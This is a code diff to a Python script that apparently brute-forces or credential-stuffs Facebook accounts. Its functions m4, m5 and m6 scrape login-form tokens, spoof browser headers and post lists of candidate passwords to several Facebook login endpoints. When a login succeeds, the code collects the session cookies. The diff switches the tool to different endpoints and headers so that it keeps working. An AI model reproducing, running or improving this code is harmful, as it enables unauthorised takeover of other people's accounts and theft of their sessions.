@@ -1065,7 +1065,7 @@ def m4(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.facebook.com').text
+   free_fb = session.get(f'https://p.facebook.com').text
    log_data = {
     "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1076,27 +1076,24 @@ def m4(idf,pwv):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
-   header_freefb = {
-    'Host': 'www.facebook.com',
-    'Connection': 'keep-alive',
-    'Pragma': 'no-cache',
-    'Cache-Control': 'no-cache',
-    'sec-ch-ua': 'Chromium;v=124, Android',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': 'Android',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'dnt': '1',
-    'X-Requested-With': 'mark.via.gp',
-    'Sec-Fetch-Site': 'none',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'Referer': 'https://www.google.com/',
-    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
-    'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?',data=log_data,headers=header_freefb).text
+   header_freefb =  {
+            'authority': 'p.facebook.com/',
+            'method': 'POST',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://m.facebook.com',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+   lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1144,14 +1141,35 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://mbasic.facebook.com').text
+   free_fb = session.get('https://x.facebook.com').text
    log_data = {
-    'email': idf,
-    'pass': ps}
+             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":idf,
+            "pass":ps,
+            "login":"Log In"}
    header_freefb = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-    'Content-Type': 'application/x-www-form-urlencoded',}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?',headers=header_freefb,data=log_data).text
+            'authority': 'x.facebook.com/',
+            'method': 'POST',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://m.facebook.com',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',} 
+   lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',headers=header_freefb,data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1199,7 +1217,7 @@ def m6(idf,pwv):
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
             #sys.stdout.flush()
    pro = random.choice(ugen)
-   free_fb = session.get('https://mbasic.facebook.com').text
+   free_fb = session.get('https://mobile.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1211,7 +1229,7 @@ def m6(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-            'authority': 'mbasic.facebook.com/',
+            'authority': 'mobile.facebook.com/',
             'method': 'POST',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
@@ -1227,7 +1245,7 @@ def m6(idf,pwv):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',} #'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mobile.facebook.com/login.php?next=https%3A%2F%2Fmobile.facebook.com%2Fhome.php&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
